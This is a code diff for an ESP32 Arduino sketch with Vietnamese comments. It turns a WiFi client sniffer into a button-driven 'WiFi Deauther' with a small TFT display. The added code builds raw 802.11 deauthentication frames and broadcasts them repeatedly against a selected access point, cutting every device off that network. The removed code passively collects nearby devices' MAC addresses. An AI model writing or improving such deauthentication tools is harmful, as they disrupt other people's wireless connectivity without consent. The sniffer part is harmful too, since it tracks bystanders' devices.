@@ -1,67 +1,143 @@
-#include <Arduino.h>
 #include <WiFi.h>
-#include "esp_wifi.h"
+#include <TFT_eSPI.h>
 
-#define MAX_AP_SHOW 20
-#define MAX_CLIENTS 50
+// Cấu hình cho TFT_eSPI (cần thêm vào User_Setup.h trong thư viện TFT_eSPI)
+TFT_eSPI tft = TFT_eSPI(); // Khởi tạo LCD
 
-struct Client {
-    uint8_t mac[6];
-    int rssi;
-};
+// Định nghĩa nút bấm
+#define BUTTON_UP 32
+#define BUTTON_DOWN 33
+#define BUTTON_SELECT 23
 
-volatile int clientCount = 0;
-Client clients[MAX_CLIENTS];
+// Biến toàn cục
+int selectedNetwork = 0; // Mạng được chọn
+int totalNetworks = 0;   // Tổng số mạng quét được
+String networks[20];     // Lưu SSID (giới hạn 20 cho đơn giản)
 
-void sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
-    if (type != WIFI_PKT_MGMT) return;
+// Hàm gửi packet deauth
+void sendDeauth(String bssid_str, String client_str) {
+  uint8_t deauth_pkt[26] = {
+    0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x07, 0x00
+  };
 
-    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
-    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
-    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
+  uint8_t bssid[6], client[6];
+  sscanf(bssid_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+  sscanf(client_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &client[0], &client[1], &client[2], &client[3], &client[4], &client[5]);
 
-    if (clientCount < MAX_CLIENTS) {
-        memcpy(clients[clientCount].mac, hdr->addr2, 6);
-        clients[clientCount].rssi = pkt->rx_ctrl.rssi;
-        clientCount++;
+  memcpy(&deauth_pkt[4], client, 6); // Receiver
+  memcpy(&deauth_pkt[10], bssid, 6); // BSSID
+  memcpy(&deauth_pkt[16], bssid, 6); // Source
+
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Cần lấy channel từ scan
+  esp_wifi_80211_tx(ESP_IF_WIFI_STA, deauth_pkt, sizeof(deauth_pkt), false);
+}
+
+// Hàm quét WiFi
+void scanWiFi() {
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  totalNetworks = WiFi.scanNetworks();
+  totalNetworks = min(totalNetworks, 20); // Giới hạn 20 mạng
+
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setCursor(0, 0);
+  tft.println("Networks found:");
+
+  for (int i = 0; i < totalNetworks; i++) {
+    networks[i] = WiFi.SSID(i) + " (" + WiFi.RSSI(i) + " dBm)";
+    if (i == selectedNetwork) {
+      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+      tft.println("> " + networks[i]);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    } else {
+      tft.println("  " + networks[i]);
     }
+  }
+}
+
+// Hàm hiển thị menu
+void displayMenu() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setCursor(0, 0);
+  tft.println("WiFi Deauther");
+  tft.println("1. Scan WiFi");
+  tft.println("2. Deauth Selected");
+  tft.println("Use Up/Down to select");
+}
+
+// Hàm xử lý nút bấm
+int handleButtons() {
+  if (digitalRead(BUTTON_UP) == LOW) {
+    delay(200); // Debounce
+    return 1;
+  }
+  if (digitalRead(BUTTON_DOWN) == LOW) {
+    delay(200);
+    return 2;
+  }
+  if (digitalRead(BUTTON_SELECT) == LOW) {
+    delay(200);
+    return 3;
+  }
+  return 0;
 }
 
 void setup() {
-    Serial.begin(115200);
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
+  Serial.begin(115200);
 
-    delay(100);
-    Serial.println("Scanning WiFi networks...");
+  // Khởi tạo LCD
+  tft.init();
+  tft.setRotation(3); // Xoay ngang cho 160x80
+  tft.fillScreen(TFT_BLACK);
 
-    int networksFound = WiFi.scanNetworks();
-    int show = min((int)networksFound, MAX_AP_SHOW);   // ✅ ép kiểu
+  // Cấu hình nút bấm
+  pinMode(BUTTON_UP, INPUT_PULLUP);
+  pinMode(BUTTON_DOWN, INPUT_PULLUP);
+  pinMode(BUTTON_SELECT, INPUT_PULLUP);
 
-    for (int i = 0; i < show; ++i) {
-        Serial.printf("%d: %s (%d)\n", i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i));
-    }
-
-    WiFi.scanDelete();
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_rx_cb(sniffer_cb);
+  // Hiển thị menu ban đầu
+  displayMenu();
 }
 
 void loop() {
-    delay(5000);
+  int button = handleButtons();
 
-    esp_wifi_set_promiscuous(false);
-    Serial.println("Clients detected:");
-
-    int show = min((int)clientCount, 6);   // ✅ ép kiểu
-
-    for (int i = 0; i < show; ++i) {
-        Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X (RSSI: %d)\n",
-                      clients[i].mac[0], clients[i].mac[1], clients[i].mac[2],
-                      clients[i].mac[3], clients[i].mac[4], clients[i].mac[5],
-                      clients[i].rssi);
+  if (button == 1) { // Up
+    selectedNetwork = max(0, selectedNetwork - 1);
+    scanWiFi();
+  }
+  if (button == 2) { // Down
+    selectedNetwork = min(totalNetworks - 1, selectedNetwork + 1);
+    scanWiFi();
+  }
+  if (button == 3) { // Select
+    if (totalNetworks == 0) {
+      scanWiFi();
+    } else {
+      // Thực hiện deauth cho mạng được chọn
+      String bssid = WiFi.BSSIDstr(selectedNetwork);
+      String client = "FF:FF:FF:FF:FF:FF"; // Broadcast deauth
+      tft.fillScreen(TFT_BLACK);
+      tft.setCursor(0, 0);
+      tft.println("Deauthing: " + WiFi.SSID(selectedNetwork));
+      sendDeauth(bssid, client);
+      delay(1000); // Gửi 10 lần
+      for (int i = 0; i < 10; i++) {
+        sendDeauth(bssid, client);
+        delay(100);
+      }
+      tft.println("Done! Press Select to return");
+      while (digitalRead(BUTTON_SELECT) == HIGH) {} // Chờ nhấn Select
+      displayMenu();
     }
-
-    clientCount = 0;
-    esp_wifi_set_promiscuous(true);
+  }
 }
